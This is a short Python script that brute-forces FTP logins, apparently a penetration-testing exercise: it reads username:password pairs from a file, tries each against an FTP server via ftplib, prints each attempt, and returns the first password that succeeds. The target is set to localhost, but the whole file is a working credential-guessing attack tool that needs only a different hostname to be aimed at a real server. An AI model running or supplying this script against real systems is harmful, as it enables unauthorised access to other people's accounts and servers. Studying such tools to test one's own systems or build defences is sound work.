import ftplib


def bruteLogin(hostname, passfile):
    pF = open(passfile, "r")
    for line in pF.readlines():
        userName = line.split(":")[0]
        password = line.split(":")[1].strip("\r").strip("\n")
        print("trying with" + userName + "/" + password)
        try:
            ftp = ftplib.FTP(hostname)
            ftp.login(userName, password)
            print("[+] Password Found: " + password)
            ftp.quit()
            return password
        except Exception as e:
            print(e)
            pass
    print("[-] Password Not Found.")
    return None


host = "127.0.0.1"
bruteLogin(host, "passwfile.txt")
